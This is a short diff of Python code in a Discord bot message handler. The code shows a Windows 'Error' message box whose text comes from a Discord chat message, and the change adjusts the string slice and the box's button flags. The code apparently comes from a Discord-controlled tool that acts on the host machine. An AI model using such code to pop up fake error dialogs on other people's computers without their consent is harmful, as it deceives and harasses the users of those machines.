@@ -148,7 +148,7 @@ async def on_message(message):
             MB_HELP = 0x4000
             ICON_STOP = 0x10
             def mess():
-                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
+                ctypes.windll.user32.MessageBoxW(0, message.content[7:], "Error", MB_YESNO | ICON_STOP) #Show message box
             import threading
             messa = threading.Thread(target=mess)
             messa._running = True
